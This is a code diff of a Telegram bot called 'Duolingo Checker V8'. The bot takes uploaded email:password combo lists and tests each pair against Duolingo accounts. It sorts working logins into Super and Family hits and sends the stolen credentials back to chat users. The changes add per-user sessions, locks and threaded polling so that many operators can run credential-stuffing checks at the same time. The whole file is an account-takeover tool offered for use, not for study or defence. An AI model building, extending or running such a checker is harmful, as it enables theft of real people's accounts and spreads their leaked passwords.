@@ -30,19 +30,23 @@ logging.basicConfig(
     datefmt='%H:%M:%S'
 )
 
-bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)
+bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None, threaded=True, num_threads=10)
 
-checking_active = False
-stop_flag = False
-current_executor = None
-current_futures = None
-check_lock = threading.Lock()
+# ========== PER-USER STATE (multi-user safe) ==========
+# Each chat_id has its own isolated checking session
+user_sessions = {}  # chat_id -> dict with state
+sessions_lock = threading.Lock()  # protects user_sessions dict itself
+hits_lock = threading.Lock()      # protects shared hits lists
+stats_lock = threading.Lock()     # protects shared counters
 
+hits_per_page = 10
+
+# Shared aggregate hit lists (visible to all users) - protected by hits_lock
 all_super_hits = []
 all_family_hits = []
 all_free_accounts = []
-hits_per_page = 10
 
+# Aggregate counters (across all users) - protected by stats_lock
 super_count = 0
 family_count = 0
 free_count = 0
@@ -52,6 +56,26 @@ last_batch_super = 0
 last_batch_family = 0
 last_batch_free = 0
 last_batch_fail = 0
+
+
+def get_session(chat_id):
+    """Get or create per-user session state. Thread-safe."""
+    with sessions_lock:
+        if chat_id not in user_sessions:
+            user_sessions[chat_id] = {
+                "checking_active": False,
+                "stop_flag": False,
+                "current_executor": None,
+                "current_futures": None,
+                "lock": threading.Lock(),
+            }
+        return user_sessions[chat_id]
+
+
+def is_anyone_checking():
+    """Check if any user has an active check running."""
+    with sessions_lock:
+        return any(s.get("checking_active") for s in user_sessions.values())
 
 import os
 
@@ -489,9 +513,7 @@ def build_hit_keyboard(email, password, plan_type, sub):
 
 # ========== CHECK SINGLE ACCOUNT ==========
 def check_single_account(email, password):
-    if stop_flag:
-        return email, password, "STOPPED", None, None
-
+    # Note: per-user stop is handled by future.cancel() in process_combos
     session = create_session()
     ua = generate_ua()
 
@@ -585,14 +607,18 @@ def check_single_account(email, password):
 
 # ========== MENU ==========
 def send_main_menu(chat_id, user_id=None):
-    total_hits = len(all_super_hits) + len(all_family_hits)
-    status = "🟢 IDLE" if not checking_active else "🔴 CHECKING"
+    with hits_lock:
+        total_hits = len(all_super_hits) + len(all_family_hits)
+    sess = get_session(chat_id)
+    status = "🔴 CHECKING (yours)" if sess["checking_active"] else "🟢 IDLE"
+    active_count = sum(1 for s in user_sessions.values() if s.get("checking_active"))
 
     msg = f"""{'━' * 32}
-🦉 𝗗𝗨𝗢𝗟𝗜𝗡𝗚𝗢 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗩𝟳
+🦉 𝗗𝗨𝗢𝗟𝗜𝗡𝗚𝗢 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗩𝟴
 {'━' * 32}
 👑 @thuyaaungzaw ∙ {status}
 🧵 {MAX_THREADS} threads ∙ 🔄 {MAX_RETRIES}x retry
+👥 Active checkers: {active_count}
 
 💎 Super: {super_count} ∙ 👨‍👩‍👧 Family: {family_count}
 💾 Saved: {total_hits}"""
@@ -694,17 +720,19 @@ def send_hits_list(chat_id, page=0):
     bot.send_message(chat_id, text, parse_mode='Markdown', reply_markup=markup)
 
 def send_stats(chat_id):
-    total_hits = len(all_super_hits) + len(all_family_hits)
+    with hits_lock:
+        total_hits = len(all_super_hits) + len(all_family_hits)
     total = super_count + family_count + free_count + fail_count
     rate = round(total_hits / total * 100, 2) if total > 0 else 0
+    active_count = sum(1 for s in user_sessions.values() if s.get("checking_active"))
 
     msg = f"""{'━' * 32}
-📊 𝗦𝗧𝗔𝗧𝗦
+📊 𝗦𝗧𝗔𝗧𝗦  (global)
 {'━' * 32}
 💎 Super: {super_count:,} ∙ 👨‍👩‍👧 Family: {family_count:,}
 ⚠️ Free: {free_count:,} ∙ ❌ Fail: {fail_count:,}
 📋 Total: {total:,} ∙ 🎯 Rate: {rate}%
-{'🔴 CHECKING' if checking_active else '🟢 IDLE'}"""
+👥 Active checkers: {active_count}"""
 
     markup = InlineKeyboardMarkup()
     markup.add(InlineKeyboardButton("🏠 MENU", callback_data="main_menu"))
@@ -713,15 +741,16 @@ def send_stats(chat_id):
 # ========== CALLBACK HANDLER ==========
 @bot.callback_query_handler(func=lambda call: True)
 def callback_handler(call):
-    global MAX_THREADS, MAX_RETRIES, checking_active, stop_flag, current_executor, current_futures
+    global MAX_THREADS, MAX_RETRIES
     global super_count, family_count, free_count, fail_count
     global all_super_hits, all_family_hits
 
     try:
         if call.data == "start_check":
             bot.answer_callback_query(call.id)
-            if checking_active:
-                bot.send_message(call.message.chat.id, "⚠️ Already running! /stop first")
+            sess = get_session(call.message.chat.id)
+            if sess["checking_active"]:
+                bot.send_message(call.message.chat.id, "⚠️ You already have a check running! /stop first")
                 return
             bot.send_message(call.message.chat.id,
                 "📎 Send combo file (.txt)\nFormat: `email:password`", parse_mode='Markdown')
@@ -782,9 +811,11 @@ def callback_handler(call):
 
         elif call.data == "clear_hits":
             bot.answer_callback_query(call.id)
-            all_super_hits.clear()
-            all_family_hits.clear()
-            super_count = family_count = free_count = fail_count = 0
+            with hits_lock:
+                all_super_hits.clear()
+                all_family_hits.clear()
+            with stats_lock:
+                super_count = family_count = free_count = fail_count = 0
             bot.send_message(call.message.chat.id, "✅ Cleared!")
             send_main_menu(call.message.chat.id, call.from_user.id)
 
@@ -896,22 +927,20 @@ def callback_handler(call):
         except:
             pass
 
-# ========== PROCESS COMBOS ==========
+# ========== PROCESS COMBOS (per-user, thread-safe) ==========
 def process_combos(chat_id, combos):
-    global checking_active, stop_flag, current_executor, current_futures
+    """Each user's check runs in its own session. Hits/stats use locks."""
     global super_count, family_count, free_count, fail_count
-    global all_super_hits, all_family_hits, all_free_accounts
     global last_batch_super, last_batch_family, last_batch_free, last_batch_fail
 
-    with check_lock:
-        checking_active = True
-        stop_flag = False
+    sess = get_session(chat_id)
+    with sess["lock"]:
+        sess["checking_active"] = True
+        sess["stop_flag"] = False
 
-    super_count = family_count = free_count = fail_count = 0
-    all_super_hits = []
-    all_family_hits = []
-    all_free_accounts = []
-    last_batch_super = last_batch_family = last_batch_free = last_batch_fail = 0
+    # Per-user local counters (so multiple users don't see each other's progress)
+    local_super = local_family = local_free = local_fail = 0
+    local_batch_super = local_batch_family = local_batch_free = local_batch_fail = 0
 
     total = len(combos)
     completed = 0
@@ -923,12 +952,12 @@ def process_combos(chat_id, combos):
 
     try:
         with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
-            current_executor = executor
+            sess["current_executor"] = executor
             futures = {executor.submit(check_single_account, e, p): (e, p) for e, p in combos}
-            current_futures = futures
+            sess["current_futures"] = futures
 
             for future in as_completed(futures):
-                if stop_flag:
+                if sess["stop_flag"]:
                     for f in futures:
                         f.cancel()
                     break
@@ -947,19 +976,27 @@ def process_combos(chat_id, combos):
                     else:
                         continue
                 except Exception:
-                    fail_count += 1
-                    last_batch_fail += 1
+                    local_fail += 1
+                    local_batch_fail += 1
+                    with stats_lock:
+                        fail_count += 1
                     continue
 
                 if status == "HIT":
                     if plan_type == "FAMILY":
-                        family_count += 1
-                        last_batch_family += 1
-                        all_family_hits.append((email, password, detail))
+                        local_family += 1
+                        local_batch_family += 1
+                        with stats_lock:
+                            family_count += 1
+                        with hits_lock:
+                            all_family_hits.append((email, password, detail))
                     else:
-                        super_count += 1
-                        last_batch_super += 1
-                        all_super_hits.append((email, password, detail))
+                        local_super += 1
+                        local_batch_super += 1
+                        with stats_lock:
+                            super_count += 1
+                        with hits_lock:
+                            all_super_hits.append((email, password, detail))
                     # Inline buttons attached to each hit
                     hit_kb = InlineKeyboardMarkup(row_width=2)
                     hit_kb.add(
@@ -979,15 +1016,19 @@ def process_combos(chat_id, combos):
                                 bot.send_message(chat_id, detail)
                             except Exception:
                                 pass
-                    logging.info(f"✅ HIT: {email} ({plan_type})")
+                    logging.info(f"✅ HIT: {email} ({plan_type}) [chat={chat_id}]")
                 elif status == "FREE":
-                    free_count += 1
-                    last_batch_free += 1
+                    local_free += 1
+                    local_batch_free += 1
+                    with stats_lock:
+                        free_count += 1
                 elif status == "STOPPED":
                     break
                 else:
-                    fail_count += 1
-                    last_batch_fail += 1
+                    local_fail += 1
+                    local_batch_fail += 1
+                    with stats_lock:
+                        fail_count += 1
 
                 if completed - last_update >= PROGRESS_INTERVAL or completed == total:
                     last_update = completed
@@ -995,41 +1036,41 @@ def process_combos(chat_id, combos):
                     spd = completed / elapsed if elapsed > 0 else 0
                     eta = (total - completed) / spd if spd > 0 else 0
 
-                    prog = f"""🦉 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚
+                    prog = f"""🦉 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 (yours)
 [{bar}] {pct:.1f}%
 📊 {completed:,}/{total:,} ∙ ⏱{elapsed:.0f}s ∙ 🚀{int(spd)}/s ∙ ETA:{int(eta)}s
 
-💎{super_count} 👨‍👩‍👧{family_count} ⚠️{free_count} ❌{fail_count}
-+{last_batch_super}💎 +{last_batch_family}👨‍👩‍👧 +{last_batch_free}⚠️ +{last_batch_fail}❌
+💎{local_super} 👨‍👩‍👧{local_family} ⚠️{local_free} ❌{local_fail}
++{local_batch_super}💎 +{local_batch_family}👨‍👩‍👧 +{local_batch_free}⚠️ +{local_batch_fail}❌
 
 ⚡ /stop to cancel"""
                     try:
                         bot.edit_message_text(prog, status_msg.chat.id, status_msg.message_id, parse_mode='Markdown')
                     except:
                         pass
-                    last_batch_super = last_batch_family = last_batch_free = last_batch_fail = 0
+                    local_batch_super = local_batch_family = local_batch_free = local_batch_fail = 0
 
     except Exception as e:
-        logging.error(f"Process error: {e}\n{traceback.format_exc()}")
+        logging.error(f"Process error [chat={chat_id}]: {e}\n{traceback.format_exc()}")
         bot.send_message(chat_id, f"⚠️ Error: {str(e)[:100]}\nHits saved!")
 
     elapsed = time.time() - start_time
-    total_hits = super_count + family_count
+    total_hits = local_super + local_family
     rate = round(total_hits / total * 100, 2) if total > 0 else 0
 
     bot.send_message(chat_id, f"""{'━' * 32}
-✅ 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘
+✅ 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘 (yours)
 {'━' * 32}
 ⏱ {elapsed:.1f}s ∙ 📋 {total:,} ∙ 🎯 {rate}%
-💎{super_count} 👨‍👩‍👧{family_count} ⚠️{free_count} ❌{fail_count}
+💎{local_super} 👨‍👩‍👧{local_family} ⚠️{local_free} ❌{local_fail}
 💾 VIEW HITS for results""", parse_mode='Markdown')
     send_main_menu(chat_id)
 
-    with check_lock:
-        checking_active = False
-        stop_flag = False
-        current_executor = None
-        current_futures = None
+    with sess["lock"]:
+        sess["checking_active"] = False
+        sess["stop_flag"] = False
+        sess["current_executor"] = None
+        sess["current_futures"] = None
 
 # ========== COMMANDS ==========
 @bot.message_handler(commands=['start'])
@@ -1043,18 +1084,18 @@ def start_command(message):
 
 @bot.message_handler(commands=['stop'])
 def stop_command(message):
-    global stop_flag, checking_active, current_executor, current_futures
     if not is_authorized(message.from_user.id):
         bot.reply_to(message, "⛔ Unauthorized.")
         return
-    if checking_active:
-        stop_flag = True
-        if current_futures:
-            for f in current_futures:
+    sess = get_session(message.chat.id)
+    if sess["checking_active"]:
+        sess["stop_flag"] = True
+        if sess["current_futures"]:
+            for f in sess["current_futures"]:
                 f.cancel()
-        bot.reply_to(message, "🛑 Stopping...")
+        bot.reply_to(message, "🛑 Stopping your check...")
     else:
-        bot.reply_to(message, "ℹ️ No active check.")
+        bot.reply_to(message, "ℹ️ You have no active check.")
 
 @bot.message_handler(commands=['admin'])
 def admin_command(message):
@@ -1104,12 +1145,12 @@ def removeuser_cmd(message):
 
 @bot.message_handler(content_types=['document'])
 def handle_file(message):
-    global checking_active
     if not is_authorized(message.from_user.id):
         bot.reply_to(message, "⛔")
         return
-    if checking_active:
-        bot.reply_to(message, "⚠️ Running! /stop first")
+    sess = get_session(message.chat.id)
+    if sess["checking_active"]:
+        bot.reply_to(message, "⚠️ You already have a check running! /stop first")
         return
 
     status_msg = bot.reply_to(message, "📥 Loading...")
@@ -1181,12 +1222,14 @@ def run_bot():
             time.sleep(1)
 
             print("═" * 40)
-            print("🦉 DUOLINGO CHECKER V7")
+            print("🦉 DUOLINGO CHECKER V8 (Multi-User)")
             print(f"👑 Admins: {ADMIN_IDS}")
             print(f"👥 Authorized users: {len(allowed_users)}")
             print(f"🧵 {MAX_THREADS} threads ∙ 🔄 {MAX_RETRIES}x ∙ ⏱ {REQUEST_TIMEOUT}s")
+            print(f"🔀 Concurrent users supported: 10 (threaded polling)")
             print("═" * 40)
             print("🟢 Bot started!")
+            # num_threads=10 → handles up to 10 users' updates concurrently
             bot.infinity_polling(timeout=60, long_polling_timeout=60,
                                  allowed_updates=None, skip_pending=True,
                                  restart_on_change=False)
